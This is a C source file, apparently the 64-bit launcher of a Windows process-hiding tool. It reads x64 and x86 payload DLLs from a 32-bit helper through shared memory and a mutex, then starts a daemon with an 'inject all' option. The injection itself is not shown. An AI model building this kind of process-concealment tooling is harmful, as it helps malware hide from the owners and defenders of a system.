#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <tchar.h>
#include "../ProcessHider/Daemon.h"
#include "../ProcessHider/Preparations.h"
#include "..\Common\ArgumentsPassing.h"


 BYTE *x86PayloadByteArr;
 int x64PayloadSize;
 BYTE *x64PayloadByteArr;
 int x86PayloadSize;

 //Get DLLs from the 32 bit file, using the mechanism specified there
BOOL getDLLs()
{
	HANDLE hMapFile;
	DWORD *pBuf;

	hMapFile = OpenFileMapping(
		FILE_MAP_ALL_ACCESS,   // read/write access
		FALSE,                 // do not inherit the name
		mappingName);               // name of mapping object

	if (hMapFile == NULL)
	{
		_tprintf(TEXT("Could not open file mapping object (%d).\n"),
			GetLastError());
		return FALSE;
	}

	pBuf = (DWORD *)MapViewOfFile(hMapFile, // handle to map object
		FILE_MAP_ALL_ACCESS,  // read/write permission
		0,
		0,
		mappingSize);

	if (pBuf == NULL)
	{
		_tprintf(TEXT("Could not map view of file (%d).\n"),
			GetLastError());

		CloseHandle(hMapFile);

		return FALSE;
	}
	x64PayloadByteArr = (BYTE *)pBuf[0];
	x64PayloadSize = pBuf[1];
	x86PayloadByteArr = (BYTE *)pBuf[2];
	x86PayloadSize = pBuf[3];
	HANDLE hMutex=OpenMutex(SYNCHRONIZE, FALSE, MutexName);
	if(hMutex==NULL) ERROR_PRINT("Can't find mutex to send ACK to 32 bit!")
	pBuf[numOfMappingItems - 1] = 0; //signal to 32 bit process
	ReleaseMutex(hMutex);
	UnmapViewOfFile(pBuf);
	CloseHandle(hMutex);
	CloseHandle(hMapFile);

	return TRUE;
}



int _tmain(int argc, _TCHAR* argv[])
{
	if (!getDLLs())
		return 1;
	BOOL InjectALL = FALSE;
	if(PrepareContents(argc, argv,&InjectALL))
	LaunchDaemon(InjectALL);
}